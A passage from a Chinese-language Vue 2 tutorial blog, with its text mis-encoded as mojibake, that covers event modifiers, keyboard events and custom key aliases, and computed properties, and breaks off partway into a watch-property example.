é˜»æ­¢é»˜è®¤äº‹ä»¶ï¼ˆå¸¸ç”¨ï¼‰ --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://www.atguigu.com&quot;</span> @<span class="hljs-attr">click.prevent</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span>ç‚¹æˆ‘æç¤ºä¿¡æ¯<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><br>      <span class="hljs-comment">&lt;!-- é˜»æ­¢äº‹ä»¶å†’æ³¡ï¼ˆå¸¸ç”¨ï¼‰ --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo1&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click.stop</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span>ç‚¹æˆ‘æç¤ºä¿¡æ¯<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- ä¿®é¥°ç¬¦å¯ä»¥è¿ç»­å†™ --&gt;</span><br>        <span class="hljs-comment">&lt;!-- &lt;a href=&quot;http://www.qq.com&quot; @click.prevent.stop=&quot;showInfo&quot;&gt;ç‚¹æˆ‘æç¤º&lt;/a&gt; --&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>      <span class="hljs-comment">&lt;!-- äº‹ä»¶åªè§¦å‘ä¸€æ¬¡ï¼ˆå¸¸ç”¨ï¼‰ --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click.once</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span>ç‚¹æˆ‘æç¤ºä¿¡æ¯<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br>      <span class="hljs-comment">&lt;!-- ä½¿ç”¨äº‹ä»¶çš„æ•è·æ¨¡å¼ --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;box1&quot;</span> @<span class="hljs-attr">click.capture</span>=<span class="hljs-string">&quot;showMsg(1)&quot;</span>&gt;</span><br>        div1<br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;box2&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showMsg(2)&quot;</span>&gt;</span><br>          div2<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>      <span class="hljs-comment">&lt;!-- åªæœ‰event.targetæ˜¯å½“å‰æ“ä½œçš„å…ƒç´ æ—¶æ‰è§¦å‘äº‹ä»¶ï¼› --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo1&quot;</span> @<span class="hljs-attr">click.self</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span>ç‚¹æˆ‘æç¤ºä¿¡æ¯<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>      <span class="hljs-comment">&lt;!-- äº‹ä»¶çš„é»˜è®¤è¡Œä¸ºç«‹å³æ‰§è¡Œï¼Œæ— éœ€ç­‰å¾…äº‹ä»¶å›è°ƒæ‰§è¡Œå®Œæ¯•ï¼› --&gt;</span><br>      <span class="hljs-comment">&lt;!-- scrollæ˜¯æ»šåŠ¨æ¡æ»šåŠ¨ï¼Œpasssiveæ²¡æœ‰å½±å“ --&gt;</span><br>      <span class="hljs-comment">&lt;!-- wheelæ˜¯é¼ æ ‡æ»šè½®æ»šåŠ¨ï¼Œpassiveæœ‰å½±å“ --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> @<span class="hljs-attr">wheel.passive</span>=<span class="hljs-string">&quot;demo&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;list&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;å°šç¡…è°·&#x27;</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-title function_">showInfo</span>(<span class="hljs-params">e</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;åŒå­¦ä½ å¥½ï¼&#x27;</span>)</span><br><span class="language-javascript">            <span class="hljs-comment">// console.log(e.target)</span></span><br><span class="language-javascript">          &#125;,</span><br><span class="language-javascript">          <span class="hljs-title function_">showMsg</span>(<span class="hljs-params">msg</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(msg)</span><br><span class="language-javascript">          &#125;,</span><br><span class="language-javascript">          <span class="hljs-title function_">demo</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100000</span>; i++) &#123;</span><br><span class="language-javascript">              <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;#&#x27;</span>)</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;ç´¯åäº†&#x27;</span>)</span><br><span class="language-javascript">          &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;)</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-8-é”®ç›˜äº‹ä»¶"><a href="#1-8-é”®ç›˜äº‹ä»¶" class="headerlink" title="1.8 é”®ç›˜äº‹ä»¶"></a>1.8 é”®ç›˜äº‹ä»¶</h2><p>é”®ç›˜äº‹ä»¶è¯­æ³•ç³–ï¼š<code>@keydown</code>ï¼Œ<code>@keyup</code></p><ol><li>Vueä¸­å¸¸ç”¨çš„æŒ‰é”®åˆ«å<br>å›è½¦ enter<br>åˆ é™¤deleteæ•è·â€œåˆ é™¤â€å’Œâ€œé€€æ ¼â€é”®<br>é€€å‡º esc<br>ç©ºæ ¼ space<br>æ¢è¡Œ tab ç‰¹æ®Šï¼Œå¿…é¡»é…åˆ<strong>keydown</strong>å»ä½¿ç”¨<br>ä¸Š up<br>ä¸‹ down<br>å·¦ left<br>å³ right</li><li>Vueæœªæä¾›åˆ«åçš„æŒ‰é”®ï¼Œå¯ä»¥ä½¿ç”¨æŒ‰é”®åŸå§‹çš„keyå€¼å»ç»‘å®šï¼Œä½†æ³¨æ„è¦è½¬ä¸ºkebab-caseï¼ˆå¤šå•è¯å°å†™çŸ­æ¨ªçº¿å†™æ³•ï¼‰</li><li>ç³»ç»Ÿä¿®é¥°é”®ï¼ˆç”¨æ³•ç‰¹æ®Šï¼‰ctrl alt shift metaï¼ˆmetaå°±æ˜¯winé”®ï¼‰<ul><li>é…åˆkeyupä½¿ç”¨ï¼šæŒ‰ä¸‹ä¿®é¥°é”®çš„åŒæ—¶ï¼Œå†æŒ‰ä¸‹å…¶ä»–é”®ï¼Œéšåé‡Šæ”¾å…¶ä»–é”®ï¼Œäº‹ä»¶æ‰è¢«è§¦å‘<br>æŒ‡å®š ctrl+y ä½¿ç”¨ @keyup.ctr.y</li><li>é…åˆkeydownä½¿ç”¨ï¼šæ­£å¸¸è§¦å‘äº‹ä»¶</li></ul></li><li>ä¹Ÿå¯ä»¥ä½¿ç”¨keyCodeå»æŒ‡å®šå…·ä½“çš„æŒ‰é”®ï¼ˆä¸æ¨èï¼‰</li><li>Vue.config.keyCodes.è‡ªå®šä¹‰é”®å &#x3D; é”®ç ï¼Œå¯ä»¥å»å®šåˆ¶æŒ‰é”®åˆ«å</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>é”®ç›˜äº‹ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- å¼•å…¥Vue --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;æŒ‰ä¸‹å›è½¦æç¤ºè¾“å…¥&quot;</span> @<span class="hljs-attr">keyup.enter</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;æŒ‰ä¸‹ctrl+éšæ„æç¤ºè¾“å…¥&quot;</span> @<span class="hljs-attr">keyup.ctrl</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;æŒ‰ä¸‹ctrl+yæç¤ºè¾“å…¥&quot;</span> @<span class="hljs-attr">keyup.ctrl.y</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;æŒ‰ä¸‹tabæç¤ºè¾“å…¥&quot;</span> @<span class="hljs-attr">keydown.tab</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;æŒ‰ä¸‹å›è½¦æç¤ºè¾“å…¥&quot;</span> @<span class="hljs-attr">keydown.huiche</span>=<span class="hljs-string">&quot;showInfo&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">//   Vue.config.productionTip = false// é˜»æ­¢ vue åœ¨å¯åŠ¨æ—¶ç”Ÿæˆç”Ÿäº§æç¤ºã€‚</span></span><br><span class="language-javascript">      <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">keyCodes</span>.<span class="hljs-property">huiche</span> = <span class="hljs-number">13</span><span class="hljs-comment">// å®šä¹‰äº†ä¸€ä¸ªåˆ«åæŒ‰é”®</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">      <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;cess&#x27;</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">          <span class="hljs-title function_">showInfo</span>(<span class="hljs-params">e</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-comment">// console.log(e.key,e.keyCode)</span></span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>)</span><br><span class="language-javascript">          &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">      &#125;)</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-9-è®¡ç®—å±æ€§"><a href="#1-9-è®¡ç®—å±æ€§" class="headerlink" title="1.9 è®¡ç®—å±æ€§"></a>1.9 è®¡ç®—å±æ€§</h2><ul><li>å®šä¹‰ï¼šè¦ç”¨çš„å±æ€§ä¸å­˜åœ¨ï¼Œè¦é€šè¿‡å·²æœ‰å±æ€§è®¡ç®—å¾—æ¥</li><li>åŸç†ï¼šåº•å±‚å€ŸåŠ©äº†Objcet.definePropertyæ–¹æ³•æä¾›çš„getterå’Œsetter</li><li>getå‡½æ•°ä»€ä¹ˆæ—¶å€™æ‰§è¡Œï¼Ÿ<ul><li>(1).åˆæ¬¡è¯»å–æ—¶ä¼šæ‰§è¡Œä¸€æ¬¡</li><li>(2).å½“ä¾èµ–çš„æ•°æ®å‘ç”Ÿæ”¹å˜æ—¶ä¼šè¢«å†æ¬¡è°ƒç”¨</li></ul></li><li>ä¼˜åŠ¿ï¼šä¸methodså®ç°ç›¸æ¯”ï¼Œå†…éƒ¨æœ‰ç¼“å­˜æœºåˆ¶ï¼ˆå¤ç”¨ï¼‰ï¼Œæ•ˆç‡æ›´é«˜ï¼Œè°ƒè¯•æ–¹ä¾¿</li><li>å¤‡æ³¨ï¼š<ul><li>è®¡ç®—å±æ€§æœ€ç»ˆä¼šå‡ºç°åœ¨vmä¸Šï¼Œç›´æ¥è¯»å–ä½¿ç”¨å³å¯</li><li>å¦‚æœè®¡ç®—å±æ€§è¦è¢«ä¿®æ”¹ï¼Œé‚£å¿…é¡»å†™setå‡½æ•°å»å“åº”ä¿®æ”¹ï¼Œä¸”setä¸­è¦å¼•èµ·è®¡ç®—æ—¶ä¾èµ–çš„æ•°æ®å‘ç”Ÿæ”¹å˜</li></ul></li></ul><blockquote><p>è®¡ç®—å±æ€§</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>äº‹ä»¶çš„åŸºæœ¬ä½¿ç”¨<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- å¼•å…¥Vue --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>        å§“ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;firstName&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        åï¼š<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;lastName&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        æµ‹è¯•ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;x&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>// è¿™é‡Œä¿®æ”¹ ä¸ä¼šè°ƒ fullNameçš„getæ–¹æ³•<br>        å…¨åï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        å…¨åï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        <span class="hljs-comment">&lt;!-- å…¨åï¼š&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; &lt;br/&gt; --&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> vm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">          <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">          <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-attr">firstName</span>:<span class="hljs-string">&#x27;å¼ &#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">lastName</span>:<span class="hljs-string">&#x27;ä¸‰&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">x</span>:<span class="hljs-string">&#x27;ä½ å¥½&#x27;</span></span><br><span class="language-javascript">          &#125;,</span><br><span class="language-javascript">          <span class="hljs-attr">computed</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-comment">// å®Œæ•´å†™æ³•</span></span><br><span class="language-javascript">            <span class="hljs-attr">fullName</span>: &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;getè¢«è°ƒç”¨äº†&#x27;</span>)</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">firstName</span> + <span class="hljs-string">&#x27;-&#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastName</span></span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-title function_">set</span>(<span class="hljs-params">value</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;set&#x27;</span>, value)</span><br><span class="language-javascript">            <span class="hljs-keyword">const</span> arr = value.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;-&#x27;</span>)</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-property">firstName</span> = arr[<span class="hljs-number">0</span>]</span><br><span class="language-javascript">            <span class="hljs-variable language_">this</span>.<span class="hljs-property">lastName</span> = arr[<span class="hljs-number">1</span>]</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">      </span><br><span class="language-javascript">            <span class="hljs-comment">// ç®€å†™</span></span><br><span class="language-javascript">            <span class="hljs-comment">/* fullName() &#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">              console.log(&#x27;getè¢«è°ƒç”¨äº†&#x27;)</span></span><br><span class="hljs-comment"><span class="language-javascript">              return this.firstName + &#x27;-&#x27; + this.lastName</span></span><br><span class="hljs-comment"><span class="language-javascript">            &#125; */</span></span><br><span class="language-javascript">          &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124111838464.png" alt="image-20221124111838464"></p><h2 id="1-10-ç›‘è§†å±æ€§"><a href="#1-10-ç›‘è§†å±æ€§" class="headerlink" title="1.10 ç›‘è§†å±æ€§"></a>1.10 ç›‘è§†å±æ€§</h2><p>ç›‘è§†å±æ€§watchï¼š</p><ul><li>å½“è¢«ç›‘è§†çš„å±æ€§å˜åŒ–æ—¶, å›è°ƒå‡½æ•°è‡ªåŠ¨è°ƒç”¨, è¿›è¡Œç›¸å…³æ“ä½œ</li><li>ç›‘è§†çš„å±æ€§å¿…é¡»å­˜åœ¨ï¼Œæ‰èƒ½è¿›è¡Œç›‘è§†</li><li>é…ç½®é¡¹å±æ€§immediate:falseï¼Œæ”¹ä¸º trueï¼Œåˆ™åˆå§‹åŒ–æ—¶è°ƒç”¨ä¸€æ¬¡ handler(newValue,oldValue)</li><li>ç›‘è§†çš„ä¸¤ç§å†™æ³•ï¼š<ul><li>(1).new Vueæ—¶ä¼ å…¥watché…ç½®</li><li>(2).é€šè¿‡vm.$watchç›‘è§†</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>å¤©æ°”æ¡ˆä¾‹_ç›‘è§†å±æ€§<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>ä»Šå¤©å¤©æ°”å¾ˆ&#123;&#123;info&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span 